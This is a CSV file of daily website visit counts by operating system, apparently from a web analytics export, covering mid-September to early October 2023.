date,os,visits
2023-10-08,Playstation 4,363
2023-10-08,Firefox OS,334
2023-10-08,UNIX,194
2023-10-08,FreeBSD,117
2023-10-08,BlackBerry,106
2023-10-08,Windows Phone,85
2023-10-08,OpenBSD,71
2023-10-08,SunOS,40
2023-10-08,Xbox,17
2023-10-08,Nintendo Wii,15
2023-10-08,SymbianOS,15
2023-10-08,Mac OS,11
2023-10-08,NetBSD,10
2023-10-08,Sony,8
2023-10-08,Samsung,7
2023-10-08,WebTV,7
2023-10-08,BeOS,6
2023-10-08,Solaris,6
2023-10-08,DingOS,5
2023-10-08,PalmOS,2
2023-10-08,IRIX,1
2023-10-08,Playstation 3,1
2023-10-07,iOS,12286063
2023-10-07,Android,7079299
2023-10-07,Windows,5280410
2023-10-07,Macintosh,2493106
2023-10-07,Linux,757549
2023-10-07,Chrome OS,282884
2023-10-07,(not set),18796
2023-10-07,Tizen,989
2023-10-07,OS/2,616
2023-10-07,Fuchsia,488
2023-10-07,Firefox OS,381
2023-10-07,Playstation 4,380
2023-10-07,UNIX,224
2023-10-07,FreeBSD,148
2023-10-07,BlackBerry,112
2023-10-07,Windows Phone,94
2023-10-07,OpenBSD,45
2023-10-07,SunOS,35
2023-10-07,Xbox,28
2023-10-07,NetBSD,18
2023-10-07,SymbianOS,16
2023-10-07,Nintendo Wii,14
2023-10-07,Mac OS,11
2023-10-07,Samsung,10
2023-10-07,PalmOS,2
2023-10-07,Sony,2
2023-10-07,WebTV,2
2023-10-07,BeOS,1
2023-10-07,Playstation 3,1
2023-10-07,Solaris,1
2023-10-07,macOS X,1
2023-10-06,iOS,14326907
2023-10-06,Windows,11722368
2023-10-06,Android,8030867
2023-10-06,Macintosh,3683928
2023-10-06,Linux,863397
2023-10-06,Chrome OS,824392
2023-10-06,(not set),18652
2023-10-06,Tizen,1094
2023-10-06,OS/2,676
2023-10-06,Fuchsia,445
2023-10-06,Firefox OS,431
2023-10-06,Playstation 4,379
2023-10-06,UNIX,289
2023-10-06,FreeBSD,147
2023-10-06,BlackBerry,111
2023-10-06,Windows Phone,95
2023-10-06,OpenBSD,59
2023-10-06,SunOS,29
2023-10-06,Xbox,20
2023-10-06,Mac OS,14
2023-10-06,Solaris,14
2023-10-06,SymbianOS,12
2023-10-06,NetBSD,9
2023-10-06,Nintendo Wii,5
2023-10-06,Nokia,4
2023-10-06,Sony,4
2023-10-06,Playstation Vita,3
2023-10-06,Samsung,3
2023-10-06,WebTV,3
2023-10-06,BeOS,2
2023-10-06,LG,1
2023-10-06,MOT,1
2023-10-06,NTT DoCoMo,1
2023-10-06,Playstation 3,1
2023-10-05,iOS,15982090
2023-10-05,Windows,14374968
2023-10-05,Android,8796911
2023-10-05,Macintosh,4307565
2023-10-05,Chrome OS,1013691
2023-10-05,Linux,937095
2023-10-05,(not set),21372
2023-10-05,Tizen,1103
2023-10-05,OS/2,725
2023-10-05,Fuchsia,487
2023-10-05,Firefox OS,427
2023-10-05,Playstation 4,375
2023-10-05,UNIX,239
2023-10-05,FreeBSD,156
2023-10-05,BlackBerry,111
2023-10-05,Windows Phone,92
2023-10-05,OpenBSD,58
2023-10-05,SunOS,44
2023-10-05,NetBSD,27
2023-10-05,Xbox,24
2023-10-05,Mac OS,15
2023-10-05,Nintendo Wii,15
2023-10-05,SymbianOS,11
2023-10-05,Samsung,10
2023-10-05,Solaris,8
2023-10-05,WebTV,5
2023-10-05,Sony,4
2023-10-05,Playstation Vita,2
2023-10-05,BeOS,1
2023-10-05,IRIX,1
2023-10-05,Nintendo WiiU,1
2023-10-05,PalmOS,1
2023-10-05,Vodafone,1
2023-10-04,iOS,17444258
2023-10-04,Windows,15147996
2023-10-04,Android,9326646
2023-10-04,Macintosh,4697912
2023-10-04,Chrome OS,1074090
2023-10-04,Linux,895131
2023-10-04,(not set),17135
2023-10-04,Tizen,1189
2023-10-04,OS/2,751
2023-10-04,Fuchsia,581
2023-10-04,Firefox OS,458
2023-10-04,Playstation 4,423
2023-10-04,UNIX,251
2023-10-04,FreeBSD,176
2023-10-04,BlackBerry,109
2023-10-04,Windows Phone,99
2023-10-04,OpenBSD,56
2023-10-04,SunOS,36
2023-10-04,Xbox,30
2023-10-04,NetBSD,24
2023-10-04,Nintendo Wii,18
2023-10-04,SymbianOS,17
2023-10-04,Mac OS,12
2023-10-04,Samsung,10
2023-10-04,Sony,8
2023-10-04,Solaris,7
2023-10-04,WebTV,2
2023-10-04,AIX,1
2023-10-04,BeOS,1
2023-10-04,Nokia,1
2023-10-04,Playstation 3,1
2023-10-04,Playstation Vita,1
2023-10-03,iOS,16076754
2023-10-03,Windows,14568479
2023-10-03,Android,8330742
2023-10-03,Macintosh,4420225
2023-10-03,Chrome OS,1039548
2023-10-03,Linux,938789
2023-10-03,(not set),41384
2023-10-03,Tizen,1232
2023-10-03,OS/2,680
2023-10-03,Fuchsia,675
2023-10-03,Firefox OS,412
2023-10-03,Playstation 4,404
2023-10-03,UNIX,240
2023-10-03,FreeBSD,133
2023-10-03,BlackBerry,99
2023-10-03,Windows Phone,94
2023-10-03,OpenBSD,61
2023-10-03,SunOS,27
2023-10-03,Xbox,25
2023-10-03,SymbianOS,23
2023-10-03,NetBSD,21
2023-10-03,Mac OS,10
2023-10-03,Nintendo Wii,10
2023-10-03,Nokia,8
2023-10-03,Sony,6
2023-10-03,BeOS,4
2023-10-03,Samsung,4
2023-10-03,LG,2
2023-10-03,Vodafone,2
2023-10-03,WebTV,2
2023-10-03,macOS X,2
2023-10-03,MOT,1
2023-10-03,Solaris,1
2023-10-02,iOS,15201044
2023-10-02,Windows,15159698
2023-10-02,Android,8074390
2023-10-02,Macintosh,4517835
2023-10-02,Chrome OS,1016560
2023-10-02,Linux,896916
2023-10-02,(not set),19524
2023-10-02,Tizen,1185
2023-10-02,OS/2,662
2023-10-02,Fuchsia,539
2023-10-02,Firefox OS,427
2023-10-02,Playstation 4,400
2023-10-02,UNIX,222
2023-10-02,FreeBSD,154
2023-10-02,BlackBerry,112
2023-10-02,Windows Phone,79
2023-10-02,OpenBSD,72
2023-10-02,SunOS,44
2023-10-02,Xbox,25
2023-10-02,SymbianOS,22
2023-10-02,NetBSD,21
2023-10-02,Samsung,10
2023-10-02,Nintendo Wii,9
2023-10-02,Mac OS,8
2023-10-02,Solaris,5
2023-10-02,Nokia,4
2023-10-02,Sony,3
2023-10-02,WebTV,3
2023-10-02,Playstation Vita,2
2023-10-02,macOS X,2
2023-10-02,BeOS,1
2023-10-02,IRIX,1
2023-10-02,LG,1
2023-10-02,MOT,1
2023-10-02,NTT DoCoMo,1
2023-10-02,PalmOS,1
2023-10-02,Playstation 3,1
2023-10-02,Unknown,1
2023-10-01,iOS,10296756
2023-10-01,Android,5949787
2023-10-01,Windows,5355177
2023-10-01,Macintosh,2856893
2023-10-01,Linux,740960
2023-10-01,Chrome OS,338007
2023-10-01,(not set),18367
2023-10-01,Tizen,1133
2023-10-01,OS/2,533
2023-10-01,Fuchsia,487
2023-10-01,Playstation 4,389
2023-10-01,Firefox OS,332
2023-10-01,UNIX,197
2023-10-01,FreeBSD,110
2023-10-01,Windows Phone,85
2023-10-01,BlackBerry,62
2023-10-01,OpenBSD,62
2023-10-01,Xbox,27
2023-10-01,SunOS,26
2023-10-01,SymbianOS,24
2023-10-01,NetBSD,19
2023-10-01,Nintendo Wii,18
2023-10-01,Samsung,7
2023-10-01,Solaris,6
2023-10-01,BeOS,5
2023-10-01,Sony,5
2023-10-01,PalmOS,4
2023-10-01,Nokia,3
2023-10-01,WebTV,3
2023-10-01,MOT,2
2023-10-01,Unknown,2
2023-10-01,iPhone,2
2023-10-01,Nintendo 3DS,1
2023-09-30,iOS,12375051
2023-09-30,Android,6663930
2023-09-30,Windows,5367934
2023-09-30,Macintosh,2512056
2023-09-30,Linux,695385
2023-09-30,Chrome OS,284199
2023-09-30,(not set),19898
2023-09-30,Tizen,1083
2023-09-30,OS/2,639
2023-09-30,Fuchsia,503
2023-09-30,Playstation 4,402
2023-09-30,Firefox OS,332
2023-09-30,UNIX,250
2023-09-30,FreeBSD,137
2023-09-30,BlackBerry,97
2023-09-30,Windows Phone,83
2023-09-30,OpenBSD,60
2023-09-30,SunOS,40
2023-09-30,Xbox,27
2023-09-30,NetBSD,23
2023-09-30,SymbianOS,13
2023-09-30,Nintendo Wii,12
2023-09-30,Solaris,10
2023-09-30,Samsung,8
2023-09-30,Nokia,5
2023-09-30,Sony,5
2023-09-30,WebTV,5
2023-09-30,LG,2
2023-09-30,PalmOS,2
2023-09-30,Playstation Vita,2
2023-09-30,Mac OS,1
2023-09-30,NTT DoCoMo,1
2023-09-30,iPhone,1
2023-09-29,iOS,14475343
2023-09-29,Windows,12219803
2023-09-29,Android,7481648
2023-09-29,Macintosh,3735183
2023-09-29,Chrome OS,870553
2023-09-29,Linux,784346
2023-09-29,(not set),18393
2023-09-29,Tizen,1110
2023-09-29,OS/2,673
2023-09-29,Fuchsia,502
2023-09-29,Playstation 4,431
2023-09-29,Firefox OS,401
2023-09-29,UNIX,225
2023-09-29,FreeBSD,163
2023-09-29,Windows Phone,94
2023-09-29,BlackBerry,93
2023-09-29,OpenBSD,58
2023-09-29,SunOS,38
2023-09-29,Xbox,25
2023-09-29,NetBSD,24
2023-09-29,Nintendo Wii,18
2023-09-29,SymbianOS,15
2023-09-29,WebTV,11
2023-09-29,Samsung,8
2023-09-29,Solaris,5
2023-09-29,Sony,4
2023-09-29,Mac OS,3
2023-09-29,MOT,2
2023-09-29,Nokia,2
2023-09-29,Playstation Vita,2
2023-09-29,iPhone,2
2023-09-29,macOS X,2
2023-09-29,BeOS,1
2023-09-29,IRIX,1
2023-09-29,LG,1
2023-09-29,NTT DoCoMo,1
2023-09-29,PalmOS,1
2023-09-29,Vodafone,1
2023-09-28,iOS,15637445
2023-09-28,Windows,14122793
2023-09-28,Android,8095289
2023-09-28,Macintosh,4204727
2023-09-28,Chrome OS,1044190
2023-09-28,Linux,813748
2023-09-28,(not set),27042
2023-09-28,Tizen,1158
2023-09-28,OS/2,662
2023-09-28,Fuchsia,515
2023-09-28,Firefox OS,445
2023-09-28,Playstation 4,402
2023-09-28,UNIX,273
2023-09-28,FreeBSD,180
2023-09-28,BlackBerry,100
2023-09-28,Windows Phone,85
2023-09-28,OpenBSD,73
2023-09-28,SunOS,27
2023-09-28,Xbox,27
2023-09-28,Nintendo Wii,17
2023-09-28,SymbianOS,17
2023-09-28,NetBSD,13
2023-09-28,Mac OS,8
2023-09-28,Samsung,6
2023-09-28,WebTV,6
2023-09-28,Nokia,4
2023-09-28,Solaris,4
2023-09-28,Sony,4
2023-09-28,BeOS,2
2023-09-28,NTT DoCoMo,2
2023-09-28,PalmOS,2
2023-09-28,LG,1
2023-09-28,macOS X,1
2023-09-27,iOS,15627164
2023-09-27,Windows,13944101
2023-09-27,Android,8176516
2023-09-27,Macintosh,4251913
2023-09-27,Chrome OS,1020788
2023-09-27,Linux,808142
2023-09-27,(not set),31230
2023-09-27,Tizen,1222
2023-09-27,OS/2,744
2023-09-27,Firefox OS,499
2023-09-27,Fuchsia,495
2023-09-27,Playstation 4,438
2023-09-27,UNIX,285
2023-09-27,FreeBSD,209
2023-09-27,Windows Phone,101
2023-09-27,BlackBerry,80
2023-09-27,OpenBSD,59
2023-09-27,SunOS,39
2023-09-27,Xbox,32
2023-09-27,NetBSD,25
2023-09-27,Nintendo Wii,22
2023-09-27,SymbianOS,13
2023-09-27,Mac OS,11
2023-09-27,Solaris,10
2023-09-27,Sony,5
2023-09-27,macOS X,5
2023-09-27,Nokia,4
2023-09-27,Samsung,4
2023-09-27,WebTV,4
2023-09-27,PalmOS,2
2023-09-27,Playstation 3,2
2023-09-27,BeOS,1
2023-09-27,Playstation Portable,1
2023-09-26,iOS,15625117
2023-09-26,Windows,14961102
2023-09-26,Android,8436137
2023-09-26,Macintosh,4522845
2023-09-26,Chrome OS,1009874
2023-09-26,Linux,828582
2023-09-26,(not set),33294
2023-09-26,Tizen,1189
2023-09-26,OS/2,765
2023-09-26,Fuchsia,525
2023-09-26,Firefox OS,472
2023-09-26,Playstation 4,409
2023-09-26,UNIX,171
2023-09-26,FreeBSD,157
2023-09-26,BlackBerry,90
2023-09-26,Windows Phone,89
2023-09-26,OpenBSD,42
2023-09-26,Xbox,23
2023-09-26,SunOS,22
2023-09-26,SymbianOS,14
2023-09-26,NetBSD,13
2023-09-26,Mac OS,10
2023-09-26,Nintendo Wii,9
2023-09-26,Samsung,7
2023-09-26,Nokia,5
2023-09-26,LG,3
2023-09-26,PalmOS,2
2023-09-26,Solaris,2
2023-09-26,iPhone,2
2023-09-26,macOS X,2
2023-09-26,Sony,1
2023-09-26,WebTV,1
2023-09-25,iOS,18773168
2023-09-25,Windows,15862391
2023-09-25,Android,9677961
2023-09-25,Macintosh,5083593
2023-09-25,Chrome OS,933692
2023-09-25,Linux,798163
2023-09-25,(not set),21505
2023-09-25,Tizen,1241
2023-09-25,OS/2,826
2023-09-25,Fuchsia,573
2023-09-25,Firefox OS,528
2023-09-25,Playstation 4,435
2023-09-25,UNIX,219
2023-09-25,FreeBSD,208
2023-09-25,Windows Phone,103
2023-09-25,BlackBerry,102
2023-09-25,OpenBSD,40
2023-09-25,SunOS,39
2023-09-25,NetBSD,38
2023-09-25,Xbox,28
2023-09-25,SymbianOS,18
2023-09-25,Nintendo Wii,15
2023-09-25,Mac OS,13
2023-09-25,Samsung,10
2023-09-25,Sony,7
2023-09-25,WebTV,7
2023-09-25,Nokia,5
2023-09-25,Solaris,5
2023-09-25,macOS X,3
2023-09-25,BeOS,2
2023-09-25,Playstation 3,2
2023-09-25,Playstation Vita,1
2023-09-24,iOS,10883007
2023-09-24,Android,6243224
2023-09-24,Windows,5310110
2023-09-24,Macintosh,2859509
2023-09-24,Linux,764925
2023-09-24,Chrome OS,344332
2023-09-24,(not set),13230
2023-09-24,Tizen,1498
2023-09-24,OS/2,741
2023-09-24,Fuchsia,592
2023-09-24,Playstation 4,490
2023-09-24,Firefox OS,453
2023-09-24,UNIX,274
2023-09-24,FreeBSD,139
2023-09-24,Windows Phone,92
2023-09-24,BlackBerry,69
2023-09-24,OpenBSD,67
2023-09-24,Xbox,35
2023-09-24,Nintendo Wii,27
2023-09-24,SunOS,27
2023-09-24,NetBSD,23
2023-09-24,SymbianOS,16
2023-09-24,Samsung,6
2023-09-24,WebTV,6
2023-09-24,Nokia,5
2023-09-24,Solaris,5
2023-09-24,BeOS,4
2023-09-24,Mac OS,4
2023-09-24,Sony,4
2023-09-24,iPhone,2
2023-09-24,Nintendo WiiU,1
2023-09-24,PalmOS,1
2023-09-24,Playstation 3,1
2023-09-24,Playstation Vita,1
2023-09-24,macOS X,1
2023-09-23,iOS,13152739
2023-09-23,Android,7048416
2023-09-23,Windows,5411850
2023-09-23,Macintosh,2613158
2023-09-23,Linux,787699
2023-09-23,Chrome OS,293968
2023-09-23,(not set),18746
2023-09-23,Tizen,1252
2023-09-23,OS/2,793
2023-09-23,Fuchsia,614
2023-09-23,Playstation 4,530
2023-09-23,Firefox OS,497
2023-09-23,UNIX,235
2023-09-23,FreeBSD,165
2023-09-23,BlackBerry,100
2023-09-23,Windows Phone,94
2023-09-23,OpenBSD,67
2023-09-23,Xbox,44
2023-09-23,SunOS,36
2023-09-23,SymbianOS,20
2023-09-23,NetBSD,17
2023-09-23,Nintendo Wii,17
2023-09-23,Mac OS,7
2023-09-23,WebTV,5
2023-09-23,Samsung,3
2023-09-23,Solaris,3
2023-09-23,BeOS,2
2023-09-23,Nokia,2
2023-09-23,PalmOS,2
2023-09-23,Sony,2
2023-09-23,AIX,1
2023-09-23,LG,1
2023-09-23,macOS X,1
2023-09-22,iOS,15447673
2023-09-22,Windows,11911871
2023-09-22,Android,8028731
2023-09-22,Macintosh,3819165
2023-09-22,Chrome OS,866885
2023-09-22,Linux,813623
2023-09-22,(not set),28874
2023-09-22,Tizen,1243
2023-09-22,OS/2,778
2023-09-22,Fuchsia,598
2023-09-22,Firefox OS,516
2023-09-22,Playstation 4,478
2023-09-22,UNIX,271
2023-09-22,FreeBSD,180
2023-09-22,BlackBerry,101
2023-09-22,Windows Phone,85
2023-09-22,OpenBSD,60
2023-09-22,SunOS,32
2023-09-22,Xbox,28
2023-09-22,SymbianOS,22
2023-09-22,NetBSD,18
2023-09-22,WebTV,12
2023-09-22,Samsung,11
2023-09-22,Solaris,11
2023-09-22,Nintendo Wii,10
2023-09-22,Sony,10
2023-09-22,Nokia,5
2023-09-22,BeOS,4
2023-09-22,PalmOS,3
2023-09-22,Mac OS,2
2023-09-22,NTT DoCoMo,2
2023-09-22,Playstation Vita,2
2023-09-22,LG,1
2023-09-22,Playstation 3,1
2023-09-21,iOS,16604115
2023-09-21,Windows,14110516
2023-09-21,Android,8740540
2023-09-21,Macintosh,4284691
2023-09-21,Chrome OS,1052084
2023-09-21,Linux,832419
2023-09-21,(not set),43262
2023-09-21,Tizen,1268
2023-09-21,OS/2,791
2023-09-21,Fuchsia,620
2023-09-21,Firefox OS,489
2023-09-21,Playstation 4,411
2023-09-21,UNIX,313
2023-09-21,FreeBSD,174
2023-09-21,BlackBerry,131
2023-09-21,Windows Phone,74
2023-09-21,OpenBSD,47
2023-09-21,SunOS,35
2023-09-21,Xbox,26
2023-09-21,SymbianOS,18
2023-09-21,Nintendo Wii,17
2023-09-21,NetBSD,11
2023-09-21,WebTV,6
2023-09-21,Samsung,5
2023-09-21,BeOS,4
2023-09-21,Mac OS,4
2023-09-21,Nokia,3
2023-09-21,Playstation Vita,3
2023-09-21,Solaris,3
2023-09-21,PalmOS,2
2023-09-21,Sony,2
2023-09-21,NTT DoCoMo,1
2023-09-21,Playstation 3,1
2023-09-21,Unknown,1
2023-09-20,iOS,16526793
2023-09-20,Windows,13829555
2023-09-20,Android,8748764
2023-09-20,Macintosh,4416665
2023-09-20,Chrome OS,1014182
2023-09-20,Linux,898736
2023-09-20,(not set),50973
2023-09-20,Tizen,1197
2023-09-20,OS/2,739
2023-09-20,Fuchsia,626
2023-09-20,Firefox OS,430
2023-09-20,Playstation 4,395
2023-09-20,UNIX,251
2023-09-20,FreeBSD,178
2023-09-20,BlackBerry,117
2023-09-20,Windows Phone,88
2023-09-20,OpenBSD,44
2023-09-20,SunOS,35
2023-09-20,NetBSD,31
2023-09-20,Xbox,29
2023-09-20,SymbianOS,19
2023-09-20,Nintendo Wii,9
2023-09-20,Mac OS,8
2023-09-20,Samsung,7
2023-09-20,Solaris,6
2023-09-20,Sony,5
2023-09-20,BeOS,3
2023-09-20,Nokia,3
2023-09-20,PalmOS,3
2023-09-20,Playstation Vita,3
2023-09-20,DingOS,1
2023-09-20,LG,1
2023-09-20,MOT,1
2023-09-20,macOS X,1
2023-09-19,iOS,14750295
2023-09-19,Windows,13774117
2023-09-19,Android,7938817
2023-09-19,Macintosh,4304125
2023-09-19,Chrome OS,1010521
2023-09-19,Linux,867853
2023-09-19,(not set),22514
2023-09-19,Tizen,1195
2023-09-19,OS/2,705
2023-09-19,Fuchsia,632
2023-09-19,Firefox OS,417
2023-09-19,Playstation 4,407
2023-09-19,UNIX,197
2023-09-19,FreeBSD,128
2023-09-19,Windows Phone,108
2023-09-19,BlackBerry,107
2023-09-19,OpenBSD,66
2023-09-19,SunOS,34
2023-09-19,Xbox,21
2023-09-19,NetBSD,15
2023-09-19,Mac OS,11
2023-09-19,SymbianOS,11
2023-09-19,Nintendo Wii,10
2023-09-19,Samsung,7
2023-09-19,WebTV,7
2023-09-19,Sony,6
2023-09-19,Solaris,5
2023-09-19,Unknown,5
2023-09-19,Nokia,2
2023-09-19,PalmOS,2
2023-09-19,Playstation Vita,2
2023-09-19,MOT,1
2023-09-19,Playstation 3,1
2023-09-19,macOS X,1
2023-09-18,iOS,15136537
2023-09-18,Windows,13662112
2023-09-18,Android,7951296
2023-09-18,Macintosh,4382781
2023-09-18,Chrome OS,965529
2023-09-18,Linux,804377
2023-09-18,(not set),19852
2023-09-18,Tizen,1135
2023-09-18,OS/2,686
2023-09-18,Fuchsia,470
2023-09-18,Playstation 4,407
2023-09-18,Firefox OS,404
2023-09-18,UNIX,238
2023-09-18,FreeBSD,126
2023-09-18,BlackBerry,113
2023-09-18,OpenBSD,74
2023-09-18,Windows Phone,73
2023-09-18,SunOS,33
2023-09-18,Nintendo Wii,24
2023-09-18,SymbianOS,24
2023-09-18,Xbox,24
2023-09-18,Mac OS,23
2023-09-18,NetBSD,15
2023-09-18,Playstation Vita,6
2023-09-18,Sony,6
2023-09-18,macOS X,6
2023-09-18,Samsung,4
2023-09-18,Unknown,4
2023-09-18,BeOS,2
2023-09-18,Solaris,2
2023-09-18,WebTV,2
2023-09-18,DingOS,1
2023-09-18,Nintendo WiiU,1
2023-09-18,Nokia,1
2023-09-17,iOS,10607138
2023-09-17,Android,5868093
2023-09-17,Windows,5068621
2023-09-17,Macintosh,2590029
2023-09-17,Linux,680710
2023-09-17,Chrome OS,333184
2023-09-17,(not set),16393
2023-09-17,Tizen,1090
2023-09-17,OS/2,606
2023-09-17,Fuchsia,489
2023-09-17,Firefox OS,392
2023-09-17,Playstation 4,364
2023-09-17,UNIX,163
2023-09-17,FreeBSD,134
2023-09-17,BlackBerry,96
2023-09-17,Windows Phone,81
2023-09-17,Xbox,38
2023-09-17,OpenBSD,31
2023-09-17,SymbianOS,25
2023-09-17,SunOS,18
2023-09-17,NetBSD,12
2023-09-17,Nintendo Wii,10
2023-09-17,Mac OS,9
2023-09-17,Sony,8
2023-09-17,Unknown,6
2023-09-17,Samsung,5
2023-09-17,BeOS,4
2023-09-17,Nokia,3
2023-09-17,WebTV,2
2023-09-17,LG,1
2023-09-17,MOT,1
2023-09-17,PalmOS,1
2023-09-17,openSUSE,1
2023-09-16,iOS,12199372
2023-09-16,Android,6786841
2023-09-16,Windows,4864164
2023-09-16,Macintosh,2482838
2023-09-16,Linux,800329
2023-09-16,Chrome OS,275240
2023-09-16,(not set),21622
2023-09-16,Tizen,1156
2023-09-16,OS/2,678
2023-09-16,Fuchsia,508
2023-09-16,Firefox OS,415
2023-09-16,Playstation 4,371
2023-09-16,UNIX,176
2023-09-16,FreeBSD,122
2023-09-16,BlackBerry,119
2023-09-16,Windows Phone,70
2023-09-16,OpenBSD,58
2023-09-16,Xbox,32
2023-09-16,SunOS,17
2023-09-16,SymbianOS,15
2023-09-16,Mac OS,13
2023-09-16,NetBSD,13
2023-09-16,Nintendo Wii,13
2023-09-16,Samsung,8
2023-09-16,Sony,8
2023-09-16,Unknown,6
2023-09-16,BeOS,2
2023-09-16,Nokia,2
2023-09-16,IRIX,1
2023-09-16,LG,1
2023-09-16,MOT,1
2023-09-16,PalmOS,1
2023-09-16,Playstation Vita,1
2023-09-16,macOS X,1
2023-09-15,iOS,14813700
2023-09-15,Windows,12082243
2023-09-15,Android,7894361
2023-09-15,Macintosh,3672041
2023-09-15,Chrome OS,852515
2023-09-15,Linux,836042
2023-09-15,(not set),20201
2023-09-15,Tizen,1174
2023-09-15,OS/2,684
2023-09-15,Fuchsia,499
2023-09-15,Firefox OS,435
2023-09-15,Playstation 4,383
2023-09-15,UNIX,198
2023-09-15,FreeBSD,170
2023-09-15,BlackBerry,115
2023-09-15,Windows Phone,81
2023-09-15,OpenBSD,50
2023-09-15,notWindows,34
2023-09-15,Xbox,31
2023-09-15,SymbianOS,25
2023-09-15,SunOS,19
2023-09-15,Mac OS,18
2023-09-15,Nintendo Wii,18
2023-09-15,Sony,15
2023-09-15,NetBSD,12
2023-09-15,Unknown,8
2023-09-15,Samsung,6
2023-09-15,WebTV,6
2023-09-15,PalmOS,5
2023-09-15,Playstation Vita,5
2023-09-15,LG,3
2023-09-15,Nokia,3
2023-09-15,BeOS,1
2023-09-15,IRIX,1
2023-09-15,MOT,1
2023-09-15,Solaris,1
2023-09-15,macOS X,1
2023-09-14,iOS,15496713
2023-09-14,Windows,13860022
2023-09-14,Android,7870373
2023-09-14,Macintosh,4258677
2023-09-14,Chrome OS,973827
2023-09-14,Linux,875547
2023-09-14,(not set),19144
2023-09-14,Tizen,1268
2023-09-14,OS/2,728
2023-09-14,Fuchsia,537
2023-09-14,Firefox OS,454
2023-09-14,Playstation 4,397
2023-09-14,UNIX,244
2023-09-14,BlackBerry,158
2023-09-14,FreeBSD,143
2023-09-14,Windows Phone,87
2023-09-14,OpenBSD,58
2023-09-14,SymbianOS,42
2023-09-14,Xbox,26
2023-09-14,NetBSD,23
2023-09-14,Sony,22
2023-09-14,Mac OS,19
2023-09-14,Nintendo Wii,19
2023-09-14,SunOS,17
2023-09-14,Unknown,14
2023-09-14,Samsung,13
2023-09-14,Nokia,7
2023-09-14,PalmOS,7
2023-09-14,Playstation Vita,6
2023-09-14,WebTV,5
2023-09-14,macOS X,3
2023-09-14,IRIX,2
2023-09-14,NTT DoCoMo,2
2023-09-14,Playstation Portable,2
2023-09-14,Vodafone,2
2023-09-14,LG,1
2023-09-14,Nintendo WiiU,1
2023-09-14,Playstation 3,1